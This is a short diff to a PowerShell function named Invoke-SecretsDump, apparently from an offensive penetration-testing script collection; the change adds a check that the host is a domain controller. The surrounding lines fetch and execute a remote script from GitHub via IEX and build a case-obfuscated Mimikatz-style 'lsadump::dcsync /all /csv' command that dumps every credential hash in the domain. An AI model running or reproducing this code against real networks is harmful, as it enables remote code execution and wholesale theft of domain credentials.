@@ -4,6 +4,9 @@ Function Invoke-SecretsDump {
     [switch]$NoComputerHashes
 )
 
+$DomainControllerCheck = Get-WmiObject "Win32_ComputerSystem" | Select-Object -Expand "DomainRole"
+if ($DomainControllerCheck -ne "5"){return "NotDomainController"}
+
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/The-Viper-One/PME-Scripts/main/Invoke-Pandemonium.ps1')
 
 $Command = '"lsaDUMp::dCsyNc /DOmaIN:' + $Domain + ' /alL /cSv"'
